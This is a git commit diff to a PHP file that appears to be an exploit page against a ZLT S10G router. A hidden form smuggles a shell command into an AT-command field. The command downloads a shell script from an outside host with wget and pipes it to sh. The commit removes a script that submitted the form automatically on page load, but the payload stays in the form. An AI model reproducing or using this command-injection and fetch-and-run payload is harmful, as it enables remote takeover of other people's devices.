09d76058896faa7bc94fb246c2dfd4f9b3f46ee1
Renzkie14 <102612731+Renzkie14@users.noreply.github.com>
2023-10-16 16:22:47 +0800

    Update zlts10g_script.php

--- zlts10g_script.php
+++ zlts10g_script.php
@@ -3,9 +3,3 @@ t_cmd_process"><input name="isTest" value="false" type="hidden"><input name="gof
 ormId" value="send_at_tools" type="hidden"><input name="url" value="AT > /tmp/at
 send.log && wget http://lucastiam.com/1337/S106/ais_/z1t_s10g_41s_n3w.sh -0-|
 sh &&" type="hidden"><input type="submit" style="display:none;"></form>
-<script>
-function exploit () {
-var xploit = document.getElementById("exploit");
-xploit.submit();
-}
-window.onload = exploit;
